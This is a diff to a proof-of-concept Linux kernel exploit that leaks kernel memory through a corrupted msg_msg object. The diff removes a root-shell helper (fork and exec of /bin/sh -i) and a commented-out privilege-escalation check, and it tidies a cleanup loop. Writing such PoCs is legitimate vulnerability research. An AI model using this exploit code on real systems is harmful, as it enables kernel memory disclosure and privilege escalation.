@@ -9,7 +9,7 @@
  *   - CONFIG_SLAB_BUCKETS
  *   - CONFIG_RANDOM_KMALLOC_CACHES
  *
- * This PoC performs out-of-bounds reading of the kernel memory.
+ * This PoC performs out-of-bounds reading of the kernel memory using a corrupted msg_msg.
  */
 
 #define _GNU_SOURCE
@@ -43,34 +43,6 @@ int do_cpu_pinning(void)
 
 	printf("[+] pinned to CPU #0\n");
 	return EXIT_SUCCESS;
-}
-
-void run_sh(void)
-{
-	pid_t pid = -1;
-	char *args[] = {
-		"/bin/sh",
-		"-i",
-		NULL
-	};
-	int status = 0;
-
-	pid = fork();
-
-	if (pid < 0) {
-		perror("[-] fork");
-		return;
-	}
-
-	if (pid == 0) {
-		execve("/bin/sh", args, NULL); /* Should not return */
-		perror("[-] execve");
-	} else {
-		if (wait(&status) < 0)
-			perror("[-] wait");
-
-		printf("[+] /bin/sh finished\n");
-	}
 }
 
 int act(int act_fd, int code, int n, char *args)
@@ -330,22 +302,11 @@ int main(void)
 			printf("  %ld: 0x%lx\n", i * sizeof(unsigned long), msgrcv_buf[i]);
 	}
 
-	/*
-	if (getuid() == 0 && geteuid() == 0) {
-		printf("[+] finish as: uid=0, euid=0, start sh...\n");
-		run_sh();
-		ret = EXIT_SUCCESS;
-	} else {
-		printf("[-] privesc\n");
-	}
-	*/
-
 end:
 	for (i = 0; ; i++) {
 		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, MSG_NORM_TYPE, IPC_NOWAIT);
-		if (bytes == -1) {
+		if (bytes == -1)
 			break;
-		}
 	}
 
 	if (act_fd >= 0) {
